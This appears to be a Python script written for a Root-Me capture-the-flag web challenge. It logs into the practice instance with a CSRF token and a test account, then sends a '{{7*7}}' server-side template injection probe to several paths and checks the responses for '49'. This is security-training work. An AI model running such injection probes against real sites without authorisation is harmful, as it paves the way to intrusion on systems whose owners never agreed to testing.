import requests, re, urllib.parse
U="https://instance-019fe9e3-a6de-72c7-9cf7-76c651bf1127.challenges.root-me.pro"
s=requests.Session()
def tok(p):
    r=s.get(U+p); m=re.search(r'name="csrf_token"[^>]*value="([^"]+)"',r.text); return m.group(1) if m else None
s.post(U+"/login",data={"csrf_token":tok("/login"),"username":"pauk01","password":"Passw0rd!23","submit":"Sign In"})
P=urllib.parse.quote("{{7*7}}")
paths=[f"/profile/{P}",f"/messages/{P}",f"/{P}",f"/api/user/{P}","/nonexistentpage",
       f"/swipe?q={P}",f"/matches?q={P}",f"/search?q={P}",f"/profile/pauk01?x={P}"]
for p in paths:
    r=s.get(U+p,allow_redirects=False)
    hit="49" in r.text
    print(f"{p:35} {r.status_code} loc={r.headers.get('location')} len={len(r.text)} 49={hit}")
    if hit:
        i=r.text.find("49"); print("   CTX:",r.text[max(0,i-120):i+120].replace("\n"," "))
